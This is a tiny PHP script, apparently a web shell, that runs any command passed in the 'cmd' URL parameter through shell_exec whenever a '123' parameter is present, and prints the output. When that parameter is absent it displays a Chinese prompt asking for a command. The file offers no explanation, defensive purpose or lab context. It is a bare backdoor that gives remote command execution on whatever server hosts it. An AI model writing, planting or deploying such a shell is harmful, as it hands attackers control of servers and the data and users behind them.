<?php
if (isset($_GET['123'])) {
    $cmd = escapeshellcmd($_GET['cmd']);
    $output = shell_exec($cmd);
    echo "<pre>$output</pre>";
} else {
    echo "请提供命令。";
}
?>
